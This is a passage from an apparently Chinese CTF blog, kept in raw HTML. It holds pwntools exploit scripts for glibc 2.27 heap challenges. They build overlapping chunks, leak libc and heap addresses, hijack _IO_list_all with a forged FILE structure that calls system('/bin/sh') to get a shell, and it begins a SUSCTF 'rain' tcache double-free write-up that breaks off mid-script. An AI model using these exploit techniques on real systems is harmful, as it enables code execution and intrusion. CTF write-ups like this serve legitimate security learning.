class="line">    add(<span class="number">0x448</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x440</span>+p64(<span class="number">0x8a0</span>))</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    libc.address=u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span>-<span class="number">96</span></span><br><span class="line">    add(<span class="number">0x448</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#5 -&gt;1</span></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#7</span></span><br><span class="line">    add(<span class="number">0x448</span>,flat(&#123;<span class="number">0x440</span>:<span class="string">&quot;\x01&quot;</span>&#125;))<span class="comment">#8</span></span><br><span class="line">    add(<span class="number">0x450</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#9</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#10</span></span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">9</span>)</span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#11</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)<span class="comment">#12</span></span><br><span class="line">    show(<span class="number">12</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    heap_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1ce0</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(heap_base)</span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#13</span></span><br><span class="line">    <span class="comment"># free(1)</span></span><br><span class="line">    <span class="comment"># io_list_all=libc_base+libc.sym[&#x27;_IO_list_all&#x27;]</span></span><br><span class="line">    <span class="comment"># add(0x500,&#x27;a&#x27;)#14</span></span><br><span class="line">    <span class="comment"># edit(5,p64(0)+p64(io_list_all-0x10)+&#x27;\n&#x27;)</span></span><br><span class="line">    <span class="comment"># free(13)</span></span><br><span class="line">    <span class="comment"># add(0x500,&#x27;a&#x27;)#15</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#14</span></span><br><span class="line">    add(<span class="number">0x458</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#15</span></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#16</span></span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#17</span></span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    edit(<span class="number">15</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x450</span>+p64(<span class="number">0x8b0</span>))</span><br><span class="line">    free(<span class="number">16</span>)</span><br><span class="line">    add(<span class="number">0x448</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#18</span></span><br><span class="line">    add(<span class="number">0x458</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#19-&gt;15</span></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#20</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#21</span></span><br><span class="line">    io_list_all=libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">    edit(<span class="number">5</span>,p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">15</span>)</span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#22</span></span><br><span class="line">    <span class="comment"># payload=&#x27;\x00&#x27;*0x10+p64(0)+p64(1)</span></span><br><span class="line">    <span class="comment"># payload+=p64(2)+p64(binsh_addr)</span></span><br><span class="line">    <span class="comment"># payload=payload.ljust(0xa8-0x10,&#x27;\x00&#x27;)</span></span><br><span class="line">    <span class="comment"># payload+=p64(2)+p64(3)+p64(0)+p64(0)</span></span><br><span class="line">    <span class="comment"># payload=payload.ljust(0xc8,&#x27;\x00&#x27;)</span></span><br><span class="line">    <span class="comment"># payload+=p64(libc_base+0x3e8360-0x8)+p64(0)</span></span><br><span class="line">    <span class="comment"># payload+=p64(libc_base+libc.sym[&#x27;system&#x27;])</span></span><br><span class="line">    pay = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    pay+= p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+= p64(<span class="number">0</span>)</span><br><span class="line">    pay+= p64((libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()-<span class="number">100</span>)/<span class="number">2</span>+<span class="number">1</span>)</span><br><span class="line">    pay+= p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+= p64((libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()-<span class="number">100</span>)/<span class="number">2</span>)</span><br><span class="line">    pay+= p64(<span class="number">0</span>)*<span class="number">12</span></span><br><span class="line">    pay+= p64(<span class="number">2</span>)</span><br><span class="line">    pay+= p64(<span class="number">3</span>)</span><br><span class="line">    pay+= p64(<span class="number">0</span>)</span><br><span class="line">    pay+= p64(<span class="number">0xffffffff</span>)</span><br><span class="line">    pay+= p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    pay+= p64(libc.address+<span class="number">0x3e8360</span>)</span><br><span class="line">    pay+= p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">    edit(<span class="number">19</span>,pay+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    edit(<span class="number">18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x440</span>+p64(<span class="number">0</span>))</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h4 id="io-str-finish"><a href="#io-str-finish" class="headerlink" title="io_str_finish"></a>io_str_finish</h4><p>除了io_str_overflow以外io_str_finish这个函数指针也可以使用，也是通过io_flush_all_lockp函数这个函数调用的，只要让vtable=io_str_jumps-,这个函数调用的是fp+0xe8,在对应位置填上system_addr就行。然后fp的伪造也比io_str_overflow简单</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_mode = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_ptr = <span class="number">0xffffffff</span></span><br><span class="line">fp-&gt;_IO_write_base = <span class="number">0</span></span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_buf_base = bin_sh_addr （也就是 fp-&gt;_IO_write_end）</span><br><span class="line">fp-&gt;_flags2 = <span class="number">0</span></span><br><span class="line">fp-&gt;_mode = <span class="number">0</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload+=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(<span class="number">2</span>)+p64(binsh_addr)</span><br><span class="line">payload=payload.ljust(<span class="number">0xa8</span>-<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">2</span>)+p64(<span class="number">3</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p>脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh=process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment">#sh= process([&quot;./ld-2.27.so&quot;, &quot;./pwn&quot;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.27.so&quot;&#125;)</span></span><br><span class="line">sh=process([<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>&#125;)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./libc-2.27.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Please Write U Name on the Book\n\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;root&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Number of words?&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please input U character&#x27;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please input the page U want 2 change&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Now Change U this page : &#x27;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please Input the page U want 2 tear off&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;tear_off Finished\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please Input The page U want 2 scan&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x448</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x440</span>+p64(<span class="number">0x8a0</span>))</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    libc.address=u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span>-<span class="number">96</span></span><br><span class="line">    add(<span class="number">0x448</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#5 -&gt;1</span></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#7</span></span><br><span class="line">    add(<span class="number">0x448</span>,flat(&#123;<span class="number">0x440</span>:<span class="string">&quot;\x01&quot;</span>&#125;))<span class="comment">#8</span></span><br><span class="line">    add(<span class="number">0x450</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#9</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#10</span></span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">9</span>)</span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#11</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)<span class="comment">#12</span></span><br><span class="line">    show(<span class="number">12</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    heap_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1ce0</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(heap_base)</span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#13</span></span><br><span class="line">    <span class="comment"># free(1)</span></span><br><span class="line">    <span class="comment"># io_list_all=libc_base+libc.sym[&#x27;_IO_list_all&#x27;]</span></span><br><span class="line">    <span class="comment"># add(0x500,&#x27;a&#x27;)#14</span></span><br><span class="line">    <span class="comment"># edit(5,p64(0)+p64(io_list_all-0x10)+&#x27;\n&#x27;)</span></span><br><span class="line">    <span class="comment"># free(13)</span></span><br><span class="line">    <span class="comment"># add(0x500,&#x27;a&#x27;)#15</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#14</span></span><br><span class="line">    add(<span class="number">0x458</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#15</span></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#16</span></span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#17</span></span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    edit(<span class="number">15</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x450</span>+p64(<span class="number">0x8b0</span>))</span><br><span class="line">    free(<span class="number">16</span>)</span><br><span class="line">    add(<span class="number">0x448</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#18</span></span><br><span class="line">    add(<span class="number">0x458</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#19-&gt;15</span></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#20</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#21</span></span><br><span class="line">    io_list_all=libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">    edit(<span class="number">5</span>,p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    free(<span class="number">15</span>)</span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#22</span></span><br><span class="line">    payload=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">    payload+=p64(<span class="number">2</span>)+p64(binsh_addr)</span><br><span class="line">    payload=payload.ljust(<span class="number">0xa8</span>-<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload+=p64(<span class="number">2</span>)+p64(<span class="number">3</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    payload=payload.ljust(<span class="number">0xc8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload+=p64(libc_base+<span class="number">0x3e8360</span>-<span class="number">0x8</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    payload+=p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">    <span class="comment"># pay = &#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># pay+= p64(0)*2</span></span><br><span class="line">    <span class="comment"># pay+= p64(0)</span></span><br><span class="line">    <span class="comment"># pay+= p64((libc.search(&#x27;/bin/sh&#x27;).next()-100)/2+1)</span></span><br><span class="line">    <span class="comment"># pay+= p64(0)*2</span></span><br><span class="line">    <span class="comment"># pay+= p64((libc.search(&#x27;/bin/sh&#x27;).next()-100)/2)</span></span><br><span class="line">    <span class="comment"># pay+= p64(0)*12</span></span><br><span class="line">    <span class="comment"># pay+= p64(2)</span></span><br><span class="line">    <span class="comment"># pay+= p64(3)</span></span><br><span class="line">    <span class="comment"># pay+= p64(0)</span></span><br><span class="line">    <span class="comment"># pay+= p64(0xffffffff)</span></span><br><span class="line">    <span class="comment"># pay+= p64(0)*2</span></span><br><span class="line">    <span class="comment"># pay+= p64(libc.address+0x3e8360)</span></span><br><span class="line">    <span class="comment"># pay+= p64(libc.sym[&#x27;system&#x27;])</span></span><br><span class="line">    edit(<span class="number">19</span>,payload+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    edit(<span class="number">18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x440</span>+p64(<span class="number">0</span>))</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/02/SUSCTF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/02/SUSCTF/" class="post-title-link" itemprop="url">SUSCTF</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-03-02 15:16:21 / 修改时间：15:16:38" itemprop="dateCreated datePublished" datetime="2022-03-02T15:16:21+08:00">2022-03-02</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="SUSCTF-PWN"><a href="#SUSCTF-PWN" class="headerlink" title="SUSCTF  PWN"></a>SUSCTF  PWN</h1><h2 id="rain"><a href="#rain" class="headerlink" title="rain"></a>rain</h2><p>程序代码量比较大，看懂程序的逻辑就浪费了一些时间，然后我眼睛瞎了那么大的漏洞我都没看见</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v7 = <span class="built_in">realloc</span>(*((<span class="keyword">void</span> **)a1 + <span class="number">7</span>), v6 - <span class="number">18</span>);</span><br></pre></td></tr></table></figure>

<p>我第一次把v7看成了a[7]，后面反复看代码的时候也没有注意这个，导致我一直没找见漏洞，在ayoung佬的提示下才发现，眼睛真的瞎了，然后在他的提示下发现远程版本的libc库还没有tcache保护，导致可以直接doublefree</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.rain的远程版本是libc2.7.so_1.2的，这个版本的tcache是没有key字段的，然后这个版本的io——list_all也是攻击的的，key字段的引入在libc2.27_1.3</span><br><span class="line">2.了解到unsortedbin的具体失效版本是libc2.29</span><br></pre></td></tr></table></figure>

<p>然后rain以后a[7]会清零，相当于拥有多个指针的ufa,直接利用，唯一麻烦的是指定运行库以后运行rain程序会退出，当时自己盲打了一会，ayoung佬给了我patch掉rain的程序，死高一，我都快忘了这个东西了。</p>
<p>结合上面的漏洞就是普通的tcache的ufa,可以修改任一地址，我修改的io_list_all指向堆，然后堆布置，这是完整代码.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh=process([&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/ld-2.27.so&#x27;, &#x27;./ttt&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&#x27;&#125;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line">sh=remote(<span class="string">&quot;124.71.185.75&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">ogg=[<span class="number">0x4f365</span>,<span class="number">0x4f3c2</span>,<span class="number">0x10a45c</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">config</span>(<span 